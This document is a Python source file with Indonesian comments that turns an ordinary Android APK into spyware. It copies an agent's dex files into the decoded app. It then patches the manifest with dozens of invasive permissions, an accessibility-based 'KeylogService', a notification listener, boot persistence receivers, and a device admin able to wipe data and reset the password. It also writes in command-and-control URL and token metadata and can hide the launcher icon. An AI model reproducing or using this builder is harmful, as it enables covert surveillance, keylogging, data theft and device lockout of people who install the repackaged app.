"""Injeksi dex agent + patch manifest ke APK hasil decode."""
from __future__ import annotations

import re
import secrets
import shutil
import zipfile
from pathlib import Path

PERMISSIONS = [
    "android.permission.INTERNET",
    "android.permission.ACCESS_NETWORK_STATE",
    "android.permission.ACCESS_WIFI_STATE",
    "android.permission.CHANGE_WIFI_STATE",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.ACCESS_BACKGROUND_LOCATION",
    "android.permission.CAMERA",
    "android.permission.RECORD_AUDIO",
    "android.permission.MODIFY_AUDIO_SETTINGS",
    "android.permission.READ_CONTACTS",
    "android.permission.READ_SMS",
    "android.permission.SEND_SMS",
    "android.permission.RECEIVE_SMS",
    "android.permission.READ_CALL_LOG",
    "android.permission.CALL_PHONE",
    "android.permission.READ_PHONE_STATE",
    "android.permission.READ_PHONE_NUMBERS",
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.permission.READ_MEDIA_IMAGES",
    "android.permission.READ_MEDIA_VIDEO",
    "android.permission.READ_MEDIA_AUDIO",
    "android.permission.POST_NOTIFICATIONS",
    "android.permission.SET_WALLPAPER",
    "android.permission.WRITE_SETTINGS",
    "android.permission.REQUEST_INSTALL_PACKAGES",
    "android.permission.REQUEST_DELETE_PACKAGES",
    "android.permission.FOREGROUND_SERVICE",
    "android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION",
    "android.permission.FOREGROUND_SERVICE_CAMERA",
    "android.permission.FOREGROUND_SERVICE_MICROPHONE",
    "android.permission.FOREGROUND_SERVICE_LOCATION",
    "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
    "android.permission.WAKE_LOCK",
    "android.permission.RECEIVE_BOOT_COMPLETED",
    "android.permission.LOCKED_BOOT_COMPLETED",
    "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
    "android.permission.SYSTEM_ALERT_WINDOW",
    "android.permission.QUERY_ALL_PACKAGES",
    "android.permission.VIBRATE",
    "android.permission.REBOOT",
]

PKG = "ai.m4zk1play.spy"
ALIAS = f"{PKG}.Launcher"
FILES_SUFFIX = ".mzkfiles"

BOOT_ACTIONS = [
    "android.intent.action.BOOT_COMPLETED",
    "android.intent.action.LOCKED_BOOT_COMPLETED",
    "android.intent.action.MY_PACKAGE_REPLACED",
    "android.intent.action.QUICKBOOT_POWERON",
    "com.htc.intent.action.QUICKBOOT_POWERON",
    "android.intent.action.USER_PRESENT",
    "android.net.conn.CONNECTIVITY_CHANGE",
    "android.intent.action.TIME_SET",
    "android.intent.action.TIMEZONE_CHANGED",
]

A11Y_XML = (
    '<?xml version="1.0" encoding="utf-8"?>\n'
    '<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"\n'
    '    android:accessibilityEventTypes="typeViewTextChanged|typeViewFocused|typeViewClicked|typeWindowStateChanged"\n'
    '    android:accessibilityFeedbackType="feedbackGeneric"\n'
    '    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews"\n'
    '    android:canRetrieveWindowContent="true"\n'
    '    android:notificationTimeout="120" />\n'
)

PATHS_XML = (
    '<?xml version="1.0" encoding="utf-8"?>\n'
    "<paths>"
    '<cache-path name="c" path="." />'
    '<files-path name="f" path="." />'
    '<external-path name="e" path="." />'
    "</paths>\n"
)


def app_package(xml: str) -> str:
    """Paket aplikasi induk. Authority FileProvider mengikuti nilai ini."""
    m = re.search(r'<manifest[^>]*\bpackage="([^"]+)"', xml)
    if m is None:
        raise RuntimeError("tidak bisa membaca package dari AndroidManifest.xml")
    return m.group(1)


def _dex_numbers(decoded: Path) -> list[int]:
    used = []
    for p in decoded.glob("classes*.dex"):
        m = re.fullmatch(r"classes(\d*)\.dex", p.name)
        if m:
            used.append(int(m.group(1)) if m.group(1) else 1)
    return sorted(used)


def inject_dex(decoded: Path, agent_apk: Path) -> int:
    """Salin semua dex agent sebagai dex lanjutan."""
    if not agent_apk.exists():
        raise FileNotFoundError(
            "agent/prebuilt/agent.apk tidak ada. Jalankan ./scripts/build-agent.sh"
        )
    used = _dex_numbers(decoded)
    nxt = (max(used) if used else 1) + 1

    copied = 0
    with zipfile.ZipFile(agent_apk) as z:
        names = sorted(n for n in z.namelist() if re.fullmatch(r"classes(\d*)\.dex", n))
        if not names:
            raise RuntimeError("agent.apk tidak berisi dex")
        for name in names:
            (decoded / f"classes{nxt}.dex").write_bytes(z.read(name))
            nxt += 1
            copied += 1
    return copied


def _add_permissions(xml: str) -> str:
    anchor = re.search(r"<application\b", xml)
    if anchor is None:
        raise RuntimeError("AndroidManifest.xml tanpa tag <application>")
    block = ""
    for perm in PERMISSIONS:
        if f'android:name="{perm}"' in xml:
            continue
        block += f'    <uses-permission android:name="{perm}" />\n'
    if not block:
        return xml
    return xml[: anchor.start()] + block + xml[anchor.start():]


def _legacy_storage(xml: str) -> str:
    if "requestLegacyExternalStorage" in xml:
        return xml
    return re.sub(
        r"<application\b",
        '<application android:requestLegacyExternalStorage="true"',
        xml, count=1,
    )


def _app_attrs(xml: str, use_icon: bool) -> str:
    """Sisipkan atribut ikon ke <application> bila ikon dikirim."""
    if not use_icon or "mipmap/mzk_icon" in xml:
        return xml
    return re.sub(
        r"<application\b",
        '<application android:icon="@mipmap/mzk_icon"'
        ' android:roundIcon="@mipmap/mzk_icon"',
        xml, count=1,
    )


def _injection(authority: str, app: str, use_label: bool, use_icon: bool) -> str:
    boot = "\n".join(
        f'                <action android:name="{a}" />' for a in BOOT_ACTIONS
    )
    label = '\n            android:label="@string/mzk_label"' if use_label else ""
    return f"""
        <activity
            android:name="{PKG}.MainActivity"
            android:exported="true"
            android:theme="@style/MzkTheme"
            android:launchMode="singleTop"{label} />

        <activity
            android:name="{PKG}.LockActivity"
            android:exported="false"
            android:theme="@style/MzkLockTheme" />

        <activity
            android:name="{PKG}.PlayerActivity"
            android:exported="false"
            android:theme="@style/MzkTheme" />

        <activity-alias
            android:name="{ALIAS}"
            android:targetActivity="{PKG}.MainActivity"
            android:exported="true"
            android:enabled="true"{label}>
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <service
            android:name="{PKG}.AgentService"
            android:exported="false"
            android:stopWithTask="false"
            android:foregroundServiceType="mediaProjection|camera|microphone|location|dataSync" />

        <service
            android:name="{PKG}.Watchdog$Job"
            android:exported="false"
            android:permission="android.permission.BIND_JOB_SERVICE" />

        <service
            android:name="{PKG}.KeylogService"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/mzk_accessibility" />
        </service>

        <service
            android:name="{PKG}.NotifListener"
            android:exported="true"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <provider
            android:name="{PKG}.BootProvider"
            android:authorities="{authority}"
            android:exported="false"
            android:enabled="true" />

        <provider
            android:name="{PKG}.MzkFiles"
            android:authorities="{app}{FILES_SUFFIX}"
            android:exported="false"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/mzk_file_paths" />
        </provider>

        <receiver
            android:name="{PKG}.BootReceiver"
            android:exported="true"
            android:enabled="true">
            <intent-filter android:priority="900">
{boot}
            </intent-filter>
        </receiver>

        <receiver
            android:name="{PKG}.Watchdog"
            android:exported="false">
            <intent-filter>
                <action android:name="{PKG}.TICK" />
            </intent-filter>
        </receiver>

        <receiver
            android:name="{PKG}.AdminReceiver"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/mzk_device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
            </intent-filter>
        </receiver>
"""


def _meta(c2_url: str, token: str, pin: str, email: str, team: str) -> str:
    return (
        f'\n        <meta-data android:name="mzk.c2" android:value="{c2_url}" />'
        f'\n        <meta-data android:name="mzk.token" android:value="{token}" />'
        f'\n        <meta-data android:name="mzk.pin" android:value="{pin}" />'
        f'\n        <meta-data android:name="mzk.email" android:value="{email}" />'
        f'\n        <meta-data android:name="mzk.team" android:value="{team}" />'
    )


def _check_collision(xml: str, app: str) -> None:
    if f'android:authorities="{app}{FILES_SUFFIX}"' in xml:
        raise RuntimeError(
            f"APK target sudah punya provider authority {app}{FILES_SUFFIX}. "
            "Hapus provider lama atau pakai APK lain."
        )


def patch_manifest(decoded: Path, c2_url: str, token: str, pin: str,
                   email: str, team: str, hide: bool,
                   use_label: bool = False, use_icon: bool = False) -> None:
    mf = decoded / "AndroidManifest.xml"
    xml = mf.read_text(encoding="utf-8")

    if "</application>" not in xml:
        raise RuntimeError("AndroidManifest.xml tidak lengkap")

    app = app_package(xml)
    _check_collision(xml, app)

    xml = _add_permissions(xml)
    xml = _legacy_storage(xml)
    xml = _app_attrs(xml, use_icon)

    authority = f"{PKG}.boot.{secrets.token_hex(4)}"
    xml = xml.replace(
        "</application>",
        _injection(authority, app, use_label, use_icon) + "    </application>",
        1,
    )
    xml = xml.replace(
        "</application>", _meta(c2_url, token, pin, email, team) + "\n    </application>", 1
    )

    if hide:
        xml = re.sub(
            rf'(<activity-alias\s+android:name="{re.escape(ALIAS)}"[^>]*?)android:enabled="true"',
            r'\1android:enabled="false"',
            xml, count=1,
        )

    mf.write_text(xml, encoding="utf-8")


def inject_assets(decoded: Path) -> None:
    """Resource pendukung yang dirujuk manifest."""
    res_xml = decoded / "res" / "xml"
    res_xml.mkdir(parents=True, exist_ok=True)

    (res_xml / "mzk_device_admin.xml").write_text(
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<device-admin xmlns:android="http://schemas.android.com/apk/res/android">\n'
        "  <uses-policies>\n"
        "    <force-lock />\n    <wipe-data />\n    <reset-password />\n"
        "    <limit-password />\n    <watch-login />\n  </uses-policies>\n"
        "</device-admin>\n",
        encoding="utf-8",
    )
    (res_xml / "mzk_accessibility.xml").write_text(A11Y_XML, encoding="utf-8")
    (res_xml / "mzk_file_paths.xml").write_text(PATHS_XML, encoding="utf-8")

    values = decoded / "res" / "values"
    values.mkdir(parents=True, exist_ok=True)
    (values / "mzk_styles.xml").write_text(
        '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n'
        '  <style name="MzkTheme" parent="android:Theme.Material.NoActionBar">\n'
        '    <item name="android:statusBarColor">#05060a</item>\n'
        '    <item name="android:navigationBarColor">#05060a</item>\n'
        '    <item name="android:windowBackground">#05060a</item>\n'
        "  </style>\n"
        '  <style name="MzkLockTheme" parent="android:Theme.Material.NoActionBar.Fullscreen">\n'
        '    <item name="android:windowBackground">#000000</item>\n'
        "  </style>\n"
        "</resources>\n",
        encoding="utf-8",
    )


def ensure_package_dir(decoded: Path) -> Path:
    target = decoded / "smali" / PKG.replace(".", "/")
    if target.exists():
        shutil.rmtree(target)
    target.mkdir(parents=True, exist_ok=True)
    return target
